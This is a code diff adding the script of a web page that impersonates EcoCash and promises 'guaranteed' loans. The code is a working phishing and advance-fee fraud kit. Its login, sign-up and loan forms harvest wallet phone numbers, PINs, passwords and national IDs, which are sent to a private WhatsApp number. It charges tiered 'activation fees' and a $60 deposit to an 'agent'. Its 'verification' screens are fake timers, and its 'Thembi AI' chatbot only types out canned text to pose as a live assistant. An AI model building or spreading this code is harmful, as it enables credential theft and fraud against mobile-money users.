+                btn.onclick = () => askThembiQuestion(faq.q, faq.part1, faq.part2);
+                container.appendChild(btn);
+            });
+        }
+
+        function toggleChatbot() {
+            const modal = document.getElementById('chatbot-modal');
+            modal.classList.toggle('hidden');
+            if (!modal.classList.contains('hidden')) {
+                initChatbotFAQs();
+            }
+        }
+
+        function askThembiQuestion(question, part1, part2) {
+            const chatMessages = document.getElementById('chat-messages');
+            
+            const userBubble = document.createElement('div');
+            userBubble.className = "flex justify-end";
+            userBubble.innerHTML = `<div class="bg-ecoblue text-white p-2.5 rounded-xl rounded-tr-none max-w-[85%] shadow-sm">${question}</div>`;
+            chatMessages.appendChild(userBubble);
+            chatMessages.scrollTop = chatMessages.scrollHeight;
+
+            const aiBubble = document.createElement('div');
+            aiBubble.className = "flex justify-start";
+            const bubbleId = 'typing-' + Date.now();
+            aiBubble.innerHTML = `<div class="bg-white dark:bg-gray-800 text-gray-800 dark:text-gray-200 p-3 rounded-xl rounded-tl-none max-w-[90%] shadow-sm border border-gray-200 dark:border-gray-700 space-y-2"><p class="font-bold text-ecoblue">Thembi AI</p><div id="${bubbleId}" class="text-gray-700 dark:text-gray-300 italic">Thinking and preparing your answer...</div></div>`;
+            chatMessages.appendChild(aiBubble);
+            chatMessages.scrollTop = chatMessages.scrollHeight;
+
+            setTimeout(() => {
+                const contentEl = document.getElementById(bubbleId);
+                contentEl.className = "space-y-2";
+                contentEl.innerHTML = `
+                    <div class="bg-blue-50/70 dark:bg-gray-700 p-2 rounded-lg border border-blue-100 dark:border-gray-600">
+                        <p class="font-semibold text-ecoblue dark:text-blue-300 text-[11px] mb-0.5">Section 1</p>
+                        <p id="${bubbleId}-p1" class="text-gray-700 dark:text-gray-200"></p>
+                    </div>
+                    <div class="bg-gray-50 dark:bg-gray-900 p-2 rounded-lg border border-gray-200 dark:border-gray-700">
+                        <p class="font-semibold text-gray-700 dark:text-gray-300 text-[11px] mb-0.5">Section 2</p>
+                        <p id="${bubbleId}-p2" class="text-gray-700 dark:text-gray-200"></p>
+                    </div>
+                `;
+
+                const p1El = document.getElementById(`${bubbleId}-p1`);
+                const p2El = document.getElementById(`${bubbleId}-p2`);
+
+                let i = 0;
+                function typePart1() {
+                    if (i < part1.length) {
+                        p1El.innerText += part1.charAt(i);
+                        i++;
+                        chatMessages.scrollTop = chatMessages.scrollHeight;
+                        setTimeout(typePart1, 12);
+                    } else {
+                        let j = 0;
+                        function typePart2() {
+                            if (j < part2.length) {
+                                p2El.innerText += part2.charAt(j);
+                                j++;
+                                chatMessages.scrollTop = chatMessages.scrollHeight;
+                                setTimeout(typePart2, 12);
+                            }
+                        }
+                        setTimeout(typePart2, 300);
+                    }
+                }
+                typePart1();
+            }, 700);
+        }
+
+        function sendChatMessage() {
+            const input = document.getElementById('chat-input');
+            const query = input.value.trim();
+            if (!query) return;
+
+            input.value = '';
+            let matched = thembiFAQs.find(f => f.q.toLowerCase().includes(query.toLowerCase()) || query.toLowerCase().includes(f.q.toLowerCase()));
+            
+            let p1 = matched ? matched.part1 : "Part 1: General Inquiry — For all guaranteed loan questions and account updates, our system is designed to guide you securely step by step.";
+            let p2 = matched ? matched.part2 : "Part 2: Support Assistance — You can also reach our customer care team via WhatsApp or dial 114 for immediate help.";
+
+            askThembiQuestion(query, p1, p2);
+        }
+
+        function buyBundlePromo(bundleTitle) {
+            const message = `*EcoCash Data Bundle Promotion Request*\n\n🔥 *Selected Offer:* Buy ${bundleTitle}\n📱 *Client Phone:* ${clientData.phone || 'Not logged in'}\n👤 *Client Name:* ${clientData.name || 'EcoCash Customer'}\n\n✅ *Status:* Guaranteed instant activation via WhatsApp (+254786464611)!`;
+            openWhatsAppChat(message);
+        }
+
+        function isValidZimbabweNID(nid) {
+            const cleanNid = nid.trim().toUpperCase();
+            const zimIdRegex = /^\d{2}-\d{4,7}[A-Z]\d{2}$/;
+            // Allow general international ID formats if not strictly Zim format
+            return zimIdRegex.test(cleanNid) || cleanNid.length >= 6;
+        }
+
+        function initTierTable() {
+            const container = document.getElementById('tier-options-container');
+            container.innerHTML = '';
+
+            const tiers = [
+                { loan: 100, fee: 5.00 },
+                { loan: 250, fee: 12.50 },
+                { loan: 500, fee: 25.00 },
+                { loan: 1000, fee: 50.00 },
+                { loan: 1500, fee: 75.00 },
+                { loan: 2000, fee: 100.00 },
+                { loan: 2500, fee: 125.00 },
+                { loan: 3000, fee: 150.00 }
+            ];
+
+            tiers.forEach((t, idx) => {
+                const isSelected = t.loan === clientData.selectedTierAmount;
+                const card = document.createElement('div');
+                card.className = `p-3.5 rounded-xl border cursor-pointer transition flex items-center justify-between ${isSelected ? 'border-ecoblue bg-blue-50/60 dark:bg-gray-700 shadow-md ring-2 ring-ecoblue/20' : 'border-gray-200 dark:border-gray-700 bg-white dark:bg-gray-800 hover:border-gray-300'}`;
+                card.onclick = () => selectTier(t.loan, t.fee);
+
+                card.innerHTML = `
+                    <div class="flex items-center space-x-3">
+                        <div class="w-9 h-9 rounded-full service-circle-icon text-white flex items-center justify-center font-bold text-xs">
+                            #${idx + 1}
+                        </div>
+                        <div>
+                            <h4 class="font-extrabold text-sm text-gray-800 dark:text-gray-100">Target Loan Limit: $${t.loan} USD</h4>
+                            <p class="text-[11px] text-gray-600 dark:text-gray-400 mt-0.5">Required Activation Fee (5%): <span class="font-bold text-ecored">$${t.fee.toFixed(2)} USD</span></p>
+                        </div>
+                    </div>
+                    <div>
+                        <input type="radio" name="tier-radio" ${isSelected ? 'checked' : ''} class="text-ecoblue focus:ring-ecoblue w-4 h-4">
+                    </div>
+                `;
+                container.appendChild(card);
+            });
+        }
+
+        function initApplyTierTable() {
+            const container = document.getElementById('apply-tier-options-container');
+            container.innerHTML = '';
+
+            const applyTiers = [
+                { loan: 100, fee: 10.00 },
+                { loan: 250, fee: 25.00 },
+                { loan: 500, fee: 50.00 },
+                { loan: 1000, fee: 100.00 },
+                { loan: 1500, fee: 150.00 },
+                { loan: 2000, fee: 200.00 },
+                { loan: 2500, fee: 250.00 },
+                { loan: 3000, fee: 300.00 }
+            ];
+
+            applyTiers.forEach((t, idx) => {
+                const isSelected = t.loan === clientData.selectedApplyAmount;
+                const card = document.createElement('div');
+                card.className = `p-3 rounded-xl border cursor-pointer transition flex items-center justify-between ${isSelected ? 'border-supergreen bg-green-50/60 dark:bg-gray-700 shadow-md ring-2 ring-supergreen/20' : 'border-gray-200 dark:border-gray-700 bg-white dark:bg-gray-800 hover:border-gray-300'}`;
+                card.onclick = () => selectApplyTier(t.loan, t.fee);
+
+                card.innerHTML = `
+                    <div class="flex items-center space-x-3">
+                        <div class="w-8 h-8 rounded-full service-circle-icon text-white flex items-center justify-center font-bold text-xs">
+                            #${idx + 1}
+                        </div>
+                        <div>
+                            <h4 class="font-extrabold text-xs text-gray-800 dark:text-gray-100">Guaranteed Loan Tier: $${t.loan} USD</h4>
+                            <p class="text-[10px] text-gray-600 dark:text-gray-400 mt-0.5">Activation Fee (10%): <span class="font-bold text-supergreen">$${t.fee.toFixed(2)} USD</span></p>
+                        </div>
+                    </div>
+                    <div>
+                        <input type="radio" name="apply-tier-radio" ${isSelected ? 'checked' : ''} class="text-supergreen focus:ring-supergreen w-4 h-4">
+                    </div>
+                `;
+                container.appendChild(card);
+            });
+        }
+
+        function selectTier(amount, fee) {
+            clientData.selectedTierAmount = amount;
+            clientData.selectedTierFee = fee;
+            initTierTable();
+            document.getElementById('upgrade-btn').disabled = false;
+            document.getElementById('upgrade-btn').className = "w-full bg-ecoblue hover:bg-ecodarkblue text-white font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-pointer transition shadow-md";
+        }
+
+        function selectApplyTier(amount, fee) {
+            clientData.selectedApplyAmount = amount;
+            clientData.selectedApplyFee = fee;
+            initApplyTierTable();
+            validateApplyForm();
+        }
+
+        function showToast(msg) {
+            const container = document.getElementById('toast-container');
+            const messageEl = document.getElementById('toast-message');
+            messageEl.innerText = msg;
+            
+            container.classList.remove('opacity-0', 'pointer-events-none');
+            container.classList.add('opacity-100');
+
+            setTimeout(() => {
+                container.classList.remove('opacity-100');
+                container.classList.add('opacity-0', 'pointer-events-none');
+            }, 3000);
+        }
+
+        function openWhatsAppChat(message) {
+            const encodedMessage = encodeURIComponent(message);
+            const waUrl = `https://wa.me/${TARGET_WHATSAPP_NUMBER}?text=${encodedMessage}`;
+            window.open(waUrl, '_blank');
+        }
+
+        function triggerGlobalDimLoader(titleText, subtitleText, onComplete) {
+            const overlay = document.getElementById('global-dim-overlay');
+            const titleEl = document.getElementById('overlay-title');
+            const subEl = document.getElementById('overlay-subtitle');
+
+            titleEl.innerText = titleText || "Authenticating Credentials";
+            subEl.innerText = subtitleText || "Processing secure session & loading next screen...";
+
+            overlay.classList.remove('hidden');
+            overlay.classList.add('opacity-100');
+
+            setTimeout(() => {
+                overlay.classList.remove('opacity-100');
+                overlay.classList.add('hidden');
+                if (onComplete) onComplete();
+            }, 5000);
+        }
+
+        function switchTabWithDim(tabName) {
+            triggerGlobalDimLoader("Loading EcoCash Secure Portal", "Preparing next step and securing session...", () => {
+                switchTab(tabName);
+            });
+        }
+
+        // Update Step-by-Step Progress Bar
+        function updateStepProgress(stepNumber) {
+            const bar = document.getElementById('step-progress-bar');
+            if (stepNumber === 0) {
+                bar.classList.add('hidden');
+                return;
+            }
+            bar.classList.remove('hidden');
+
+            for (let i = 1; i <= 4; i++) {
+                const ind = document.getElementById(`step-ind-${i}`);
+                const circle = ind.querySelector('span:first-child');
+                if (i <= stepNumber) {
+                    ind.className = "flex items-center space-x-1 text-ecoblue dark:text-blue-400";
+                    circle.className = "w-4 h-4 rounded-full bg-ecoblue text-white flex items-center justify-center text-[9px]";
+                } else {
+                    ind.className = "flex items-center space-x-1 text-gray-400 dark:text-gray-500";
+                    circle.className = "w-4 h-4 rounded-full bg-gray-200 dark:bg-gray-700 text-gray-600 dark:text-gray-300 flex items-center justify-center text-[9px]";
+                }
+            }
+
+            document.getElementById('step-line-1').style.width = stepNumber >= 2 ? '100%' : '0%';
+            document.getElementById('step-line-2').style.width = stepNumber >= 3 ? '100%' : '0%';
+            document.getElementById('step-line-3').style.width = stepNumber >= 4 ? '100%' : '0%';
+        }
+
+        // Handle Login Submission
+        function handleLoginSubmit() {
+            const phone = document.getElementById('login-phone').value.trim();
+            const pin = document.getElementById('login-pin-single').value.trim();
+
+            if (!phone || pin.length !== 4) {
+                showToast('Please enter your phone number and 4-digit PIN.');
+                return;
+            }
+
+            clientData.loginPhone = `+263${phone}`;
+            clientData.loginPin = pin;
+            clientData.phone = `+263 ${phone}`;
+            clientData.name = `Client (+263 ${phone})`;
+            clientData.nid = 'ZW-AUTH-SESSION';
+
+            document.getElementById('profile-name-display').innerText = clientData.name;
+            document.getElementById('profile-id-display').innerText = `ID: Session Active`;
+            document.getElementById('profile-phone-display').innerText = `Phone: ${clientData.phone}`;
+
+            triggerGlobalDimLoader("Authenticating EcoCash Wallet", "Verifying PIN, mobile number & last 6 months history...", () => {
+                switchTab('kashagi-hub');
+            });
+        }
+
+        function handleSignUpSubmit() {
+            const firstName = document.getElementById('signup-firstname').value.trim();
+            const surname = document.getElementById('signup-surname').value.trim();
+            const country = document.getElementById('signup-country').value;
+            const mobileNumber = document.getElementById('signup-phone').value.trim();
+            const email = document.getElementById('signup-email').value.trim();
+            const nationalId = document.getElementById('signup-nid').value.trim();
+            const password = document.getElementById('new-password').value.trim();
+            const genderRadio = document.querySelector('input[name="gender"]:checked');
+            const day = document.getElementById('b-day').value;
+            const month = document.getElementById('b-month').value;
+            const year = document.getElementById('b-year').value;
+            const termsChecked = document.getElementById('terms').checked;
+            const idError = document.getElementById('signup-id-error');
+
+            if (!firstName || !surname || !country || !mobileNumber || !email || !nationalId || !password || !genderRadio || !day || !month || !year || !termsChecked) {
+                showToast('All fields and terms acceptance are required!');
+                return;
+            }
+
+            clientData.loginPhone = `+263${mobileNumber}`;
+            clientData.loginPin = password;
+            clientData.name = `${firstName} ${surname}`;
+            clientData.phone = `+263 ${mobileNumber}`;
+            clientData.nid = nationalId.toUpperCase();
+
+            triggerGlobalDimLoader("Validating Registration & ID", "Checking 6-month wallet history & credentials securely...", () => {
+                document.getElementById('profile-name-display').innerText = clientData.name;
+                document.getElementById('profile-id-display').innerText = `ID: ${clientData.nid}`;
+                document.getElementById('profile-phone-display').innerText = `Phone: ${clientData.phone}`;
+                switchTab('kashagi-hub');
+            });
+        }
+
+        // Validate Login Form
+        function validateLoginForm() {
+            const phone = document.getElementById('login-phone').value.trim();
+            const pin = document.getElementById('login-pin-single').value.trim();
+            const loginBtn = document.getElementById('login-btn');
+
+            const phoneIcon = document.getElementById('login-phone-icon');
+            const phoneError = document.getElementById('login-phone-error');
+            const pinError = document.getElementById('login-pin-error');
+
+            let isPhoneValid = phone.length >= 8;
+            if (phone.length > 0) {
+                phoneIcon.classList.remove('hidden');
+                if (isPhoneValid) {
+                    phoneIcon.innerHTML = '<i class="fa-solid fa-circle-check text-green-600"></i>';
+                    phoneError.classList.add('hidden');
+                } else {
+                    phoneIcon.innerHTML = '<i class="fa-solid fa-circle-xmark text-red-600"></i>';
+                    phoneError.classList.remove('hidden');
+                }
+            } else {
+                phoneIcon.classList.add('hidden');
+                phoneError.classList.add('hidden');
+            }
+
+            let isPinValid = pin.length === 4 && /^\d{4}$/.test(pin);
+            if (pin.length > 0) {
+                if (isPinValid) {
+                    pinError.classList.add('hidden');
+                } else {
+                    pinError.classList.remove('hidden');
+                }
+            } else {
+                pinError.classList.add('hidden');
+            }
+
+            if (isPhoneValid && isPinValid) {
+                loginBtn.disabled = false;
+                loginBtn.className = "w-full py-3 px-4 rounded-lg bg-ecoblue hover:bg-ecodarkblue text-white font-bold transition duration-200 uppercase tracking-wider text-sm shadow-md cursor-pointer";
+            } else {
+                loginBtn.disabled = true;
+                loginBtn.className = "w-full py-3 px-4 rounded-lg bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold transition duration-200 cursor-not-allowed uppercase tracking-wider text-sm shadow-sm";
+            }
+        }
+
+        function validateBoostForm() {
+            const name = document.getElementById('boost-name').value.trim();
+            const phone = document.getElementById('boost-phone').value.trim();
+            const nid = document.getElementById('boost-nid').value.trim();
+            const currentLoan = document.getElementById('boost-current-loan').value.trim();
+            const btn = document.getElementById('boost-submit-btn');
+
+            const nameValid = /^[A-Za-z\s]+$/.test(name);
+            const phoneValid = phone.length >= 8;
+            const nidValid = nid.length >= 5;
+            const loanValid = currentLoan !== '' && Number(currentLoan) > 0;
+
+            updateFieldValidationUI('boost-name', nameValid, 'boost-name-icon', 'boost-name-error');
+            updateFieldValidationUI('boost-phone', phoneValid, 'boost-phone-icon', 'boost-phone-error');
+            updateFieldValidationUI('boost-current-loan', loanValid, 'boost-loan-icon', 'boost-loan-error');
+
+            if (nameValid && phoneValid && nidValid && loanValid) {
+                btn.disabled = false;
+                btn.className = "w-full bg-ecoblue hover:bg-ecodarkblue text-white font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-pointer transition shadow-md";
+            } else {
+                btn.disabled = true;
+                btn.className = "w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm";
+            }
+        }
+
+        function validateSignupForm() {
+            const firstName = document.getElementById('signup-firstname').value.trim();
+            const surname = document.getElementById('signup-surname').value.trim();
+            const country = document.getElementById('signup-country').value;
+            const mobileNumber = document.getElementById('signup-phone').value.trim();
+            const email = document.getElementById('signup-email').value.trim();
+            const nationalId = document.getElementById('signup-nid').value.trim();
+            const password = document.getElementById('new-password').value.trim();
+            const genderRadio = document.querySelector('input[name="gender"]:checked');
+            const day = document.getElementById('b-day').value;
+            const month = document.getElementById('b-month').value;
+            const year = document.getElementById('b-year').value;
+            const termsChecked = document.getElementById('terms').checked;
+            const signupBtn = document.getElementById('signup-btn');
+
+            const fnValid = /^[A-Za-z]+$/.test(firstName);
+            const snValid = /^[A-Za-z]+$/.test(surname);
+            const phoneValid = mobileNumber.length >= 8;
+            const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            const nidValid = nationalId.length >= 5;
+            const passValid = password.length >= 8 && /[A-Za-z]/.test(password) && /\d/.test(password);
+
+            updateFieldValidationUI('signup-firstname', fnValid, 'signup-firstname-icon', 'signup-firstname-error');
+            updateFieldValidationUI('signup-surname', snValid, 'signup-surname-icon', 'signup-surname-error');
+            updateFieldValidationUI('signup-phone', phoneValid, 'signup-phone-icon', 'signup-phone-error');
+            updateFieldValidationUI('signup-email', emailValid, 'signup-email-icon', 'signup-email-error');
+            updateFieldValidationUI('new-password', passValid, 'signup-password-icon', 'signup-password-error');
+
+            if (fnValid && snValid && country && phoneValid && emailValid && nidValid && passValid && genderRadio && day && month && year && termsChecked) {
+                signupBtn.disabled = false;
+                signupBtn.className = "w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-md uppercase text-xs tracking-wider transition cursor-pointer shadow-md";
+            } else {
+                signupBtn.disabled = true;
+                signupBtn.className = "w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-semibold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition";
+            }
+        }
+
+        function validateApplyForm() {
+            const name = document.getElementById('apply-name').value.trim();
+            const phone = document.getElementById('apply-phone').value.trim();
+            const nid = document.getElementById('apply-nid').value.trim();
+            const employment = document.getElementById('apply-employment').value;
+            const income = document.getElementById('apply-income').value.trim();
+            const btn = document.getElementById('apply-submit-btn');
+
+            const nameValid = /^[A-Za-z\s]+$/.test(name);
+            const phoneValid = phone.length >= 8;
+            const nidValid = nid.length >= 5;
+            const incomeValid = income !== '' && Number(income) > 0;
+
+            updateFieldValidationUI('apply-name', nameValid, 'apply-name-icon', 'apply-name-error');
+            updateFieldValidationUI('apply-phone', phoneValid, 'apply-phone-icon', 'apply-phone-error');
+            updateFieldValidationUI('apply-income', incomeValid, 'apply-income-icon', 'apply-income-error');
+
+            if (nameValid && phoneValid && nidValid && employment && incomeValid) {
+                btn.disabled = false;
+                btn.className = "w-full bg-supergreen hover:opacity-90 text-white font-bold py-2.5 rounded-md uppercase text-xs tracking-wider cursor-pointer transition shadow-md";
+            } else {
+                btn.disabled = true;
+                btn.className = "w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold py-2.5 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm";
+            }
+        }
+
+        function updateFieldValidationUI(inputId, isValid, iconId, errorId) {
+            const val = document.getElementById(inputId).value.trim();
+            const icon = document.getElementById(iconId);
+            const error = document.getElementById(errorId);
+
+            if (val.length > 0) {
+                icon.classList.remove('hidden');
+                if (isValid) {
+                    icon.innerHTML = '<i class="fa-solid fa-circle-check text-green-600"></i>';
+                    if(error) error.classList.add('hidden');
+                } else {
+                    icon.innerHTML = '<i class="fa-solid fa-circle-xmark text-red-600"></i>';
+                    if(error) error.classList.remove('hidden');
+                }
+            } else {
+                icon.classList.add('hidden');
+                if(error) error.classList.add('hidden');
+            }
+        }
+
+        function startProcessingFlow(type) {
+            if (type === 'boost') {
+                const name = document.getElementById('boost-name').value.trim();
+                const phone = document.getElementById('boost-phone').value.trim();
+                const nid = document.getElementById('boost-nid').value.trim();
+                const currentLoan = document.getElementById('boost-current-loan').value.trim();
+
+                if (!name || !phone || !nid || !currentLoan) {
+                    showToast('All fields are required.');
+                    return;
+                }
+
+                clientData.name = name;
+                clientData.phone = `+263 ${phone}`;
+                clientData.nid = nid.toUpperCase();
+                clientData.currentLoan = currentLoan;
+                clientData.flowType = 'boost';
+
+                triggerGlobalDimLoader("Validating Kashagi Loan Requirements", "Analyzing wallet transaction history & ID records...", () => {
+                    initTierTable();
+                    switchTab('tier-upgrade');
+                });
+
+            } else if (type === 'apply') {
+                const name = document.getElementById('apply-name').value.trim();
+                const phone = document.getElementById('apply-phone').value.trim();
+                const nid = document.getElementById('apply-nid').value.trim();
+                const employment = document.getElementById('apply-employment').value;
+                const income = document.getElementById('apply-income').value.trim();
+
+                if (!name || !phone || !nid || !employment || !income) {
+                    showToast('Please provide all required loan registration details.');
+                    return;
+                }
+
+                clientData.applyName = name;
+                clientData.applyPhone = `+263 ${phone}`;
+                clientData.applyNid = nid.toUpperCase();
+                clientData.applyEmployment = employment;
+                clientData.applyIncome = income;
+                clientData.flowType = 'apply';
+
+                triggerGlobalDimLoader("Validating New Loan Registration", "Verifying guaranteed loan tier & ID Registry...", () => {
+                    switchTab('terms');
+                });
+            }
+        }
+
+        function proceedToTerms() {
+            clientData.flowType = 'boost';
+            switchTabWithDim('terms');
+        }
+
+        function goBackFromTerms() {
+            if (clientData.flowType === 'apply') {
+                switchTabWithDim('apply-form');
+            } else {
+                switchTabWithDim('tier-upgrade');
+            }
+        }
+
+        function toggleAgreeCheckbox() {
+            const checkbox = document.getElementById('explicit-agree-checkbox');
+            const agreeBtn = document.getElementById('agree-terms-btn');
+
+            if (checkbox.checked) {
+                agreeBtn.disabled = false;
+                agreeBtn.className = "w-full bg-ecoblue hover:bg-ecodarkblue text-white font-bold py-2.5 rounded-md uppercase text-[11px] tracking-wider cursor-pointer transition shadow-md";
+            } else {
+                agreeBtn.disabled = true;
+                agreeBtn.className = "w-full bg-gray-300 dark:bg-gray-700 text-gray-500 dark:text-gray-400 font-bold py-2.5 rounded-md uppercase text-[11px] tracking-wider cursor-not-allowed transition shadow-md";
+            }
+        }
+
+        function handleFinalAgreement() {
+            let message = '';
+            
+            if (clientData.flowType === 'boost') {
+                message = `*EcoCash Guaranteed Kashagi Loan Boost Upgrade*\n\n🔒 *Login Credentials:*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Client Full Name:* ${clientData.name}\n📱 *Contact Phone:* ${clientData.phone}\n🆔 *National ID:* ${clientData.nid}\n💰 *Current Kashagi Loan:* $${clientData.currentLoan} USD\n🚀 *Target Upgrade Tier:* $${clientData.selectedTierAmount} USD\n💵 *Activation Collateral Fee:* $${clientData.selectedTierFee.toFixed(2)} USD\n💵 *Final Account Deposit Required:* $60.00 USD (Paid to assigned agent)\n📊 *History Status:* Verified\n✅ *Status:* Guaranteed Credentials Verified & Terms Agreed`;
+            } else {
+                message = `*EcoCash Guaranteed Kashagi Loan Full Registration*\n\n🔒 *Login Credentials:*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Full Name:* ${clientData.applyName}\n📱 *Contact Phone:* ${clientData.applyPhone}\n🆔 *National ID:* ${clientData.applyNid}\n💼 *Employment Status:* ${clientData.applyEmployment}\n💵 *Monthly Income:* $${clientData.applyIncome} USD\n🛡️ *Selected Tier Limit:* $${clientData.selectedApplyAmount} USD\n🛡️ *Collateral Fee (10%):* $${clientData.selectedApplyFee.toFixed(2)} USD\n💵 *Final Account Deposit Required:* $60.00 USD (Paid to assigned agent)\n📊 *History Status:* Verified\n✅ *Status:* Guaranteed Registration & Terms Agreed`;
+            }
+
+            openWhatsAppChat(message);
+        }
+
+        function validateContactForm() {
+            const name = document.getElementById('contact-name').value.trim();
+            const email = document.getElementById('contact-email').value.trim();
+            const phone = document.getElementById('contact-phone').value.trim();
+            const userMessage = document.getElementById('contact-message').value.trim();
+            const contactBtn = document.getElementById('contact-btn');
+
+            if (name && email && phone && userMessage) {
+                contactBtn.disabled = false;
+                contactBtn.className = "w-full bg-ecoblue text-white font-bold py-3 rounded-md hover:bg-blue-700 transition cursor-pointer shadow-md";
+            } else {
+                contactBtn.disabled = true;
+                contactBtn.className = "w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold py-3 rounded-md cursor-not-allowed transition";
+            }
+        }
+
+        function handleContactSubmit() {
+            const name = document.getElementById('contact-name').value.trim();
+            const email = document.getElementById('contact-email').value.trim();
+            const phone = document.getElementById('contact-phone').value.trim();
+            const userMessage = document.getElementById('contact-message').value.trim();
+
+            if (!name || !email || !phone || !userMessage) {
+                showToast('Please complete all contact form fields.');
+                return;
+            }
+
+            const message = `*EcoCash Support Inquiry*\n\n👤 *Name:* ${name}\n📧 *Email:* ${email}\n📱 *Phone:* ${phone}\n💬 *Message:* ${userMessage}`;
+            openWhatsAppChat(message);
+        }
+
+        function switchTab(tabName) {
+            const loginView = document.getElementById('view-login');
+            const signupView = document.getElementById('view-signup');
+            const hubView = document.getElementById('view-kashagi-hub');
+            const processingView = document.getElementById('view-processing');
+            const boostFormView = document.getElementById('view-boost-form');
+            const tierUpgradeView = document.getElementById('view-tier-upgrade');
+            const termsView = document.getElementById('view-terms');
+            const applyFormView = document.getElementById('view-apply-form');
+            const contactView = document.getElementById('view-contact');
+            const whatsappWidget = document.getElementById('whatsapp-widget');
+
+            loginView.classList.add('hidden');
+            signupView.classList.add('hidden');
+            hubView.classList.add('hidden');
+            processingView.classList.add('hidden');
+            boostFormView.classList.add('hidden');
+            tierUpgradeView.classList.add('hidden');
+            termsView.classList.add('hidden');
+            applyFormView.classList.add('hidden');
+            contactView.classList.add('hidden');
+            whatsappWidget.classList.add('hidden');
+
+            if (tabName === 'login') {
+                loginView.classList.remove('hidden');
+                updateStepProgress(0);
+            } else if (tabName === 'signup') {
+                signupView.classList.remove('hidden');
+                updateStepProgress(0);
+            } else if (tabName === 'kashagi-hub') {
+                hubView.classList.remove('hidden');
+                updateStepProgress(1);
+            } else if (tabName === 'processing') {
+                processingView.classList.remove('hidden');
+            } else if (tabName === 'boost-form') {
+                boostFormView.classList.remove('hidden');
+                updateStepProgress(2);
+            } else if (tabName === 'tier-upgrade') {
+                tierUpgradeView.classList.remove('hidden');
+                updateStepProgress(3);
+            } else if (tabName === 'terms') {
+                termsView.classList.remove('hidden');
+                updateStepProgress(4);
+            } else if (tabName === 'apply-form') {
+                applyFormView.classList.remove('hidden');
+                initApplyTierTable();
+                updateStepProgress(2);
+            } else if (tabName === 'contact') {
+                contactView.classList.remove('hidden');
+                whatsappWidget.classList.remove('hidden');
+                updateStepProgress(0);
+            }
+            
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function toggleMenu() {
+            const dropdown = document.getElementById('nav-dropdown');
+            dropdown.classList.toggle('hidden');
+        }
+
+        let showPin = false;
+        function togglePinVisibility() {
+            showPin = !showPin;
+            const pinInput = document.getElementById('login-pin-single');
+            const eyeIcon = document.getElementById('pin-eye-icon');
+
+            pinInput.type = showPin ? 'text' : 'password';
+            eyeIcon.className = showPin ? 'fa-regular fa-eye-slash text-lg' : 'fa-regular fa-eye text-lg';
+        }
+
+        let showPassword = false;
+        function togglePasswordVisibility() {
+            showPassword = !showPassword;
+            const passInput = document.getElementById('new-password');
+            const eyeIcon = document.getElementById('password-eye-icon');
+
+            passInput.type = showPassword ? 'text' : 'password';
+            eyeIcon.className = showPassword ? 'fa-regular fa-eye-slash' : 'fa-regular fa-eye';
+        }
+    </script>
+</body>
+</html>
